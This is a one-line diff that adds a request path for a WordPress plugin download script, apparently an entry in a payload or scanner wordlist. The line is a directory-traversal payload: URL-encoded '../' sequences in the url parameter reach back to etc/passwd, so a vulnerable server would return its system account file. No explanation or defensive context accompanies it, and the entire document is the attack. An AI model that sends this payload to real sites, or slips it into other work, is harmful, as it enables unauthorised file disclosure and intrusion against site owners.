@@ -1,0 +1,1 @@
+/wp-content/plugins/wp-custom-pages/wp-download.php?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
